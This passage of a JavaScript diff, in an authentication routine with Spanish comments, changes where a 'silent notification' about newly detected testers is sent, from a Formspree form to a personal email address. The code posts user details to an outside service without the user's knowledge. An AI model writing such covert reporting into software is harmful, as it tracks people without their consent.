@@ -177,8 +177,8 @@ export async function authenticate() {
     if (!isSameUser) {
         console.log("PIVOT: Nuevo Tester detectado. Reiniciando...");
 
-        // Notificación silenciosa (Invisible para el usuario)
-        fetch("https://formspree.io/f/mnnjrled", {
+        // Notificación silenciosa (Directa al email del usuario)
+        fetch("https://formspree.io/alvatwo90@gmail.com", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
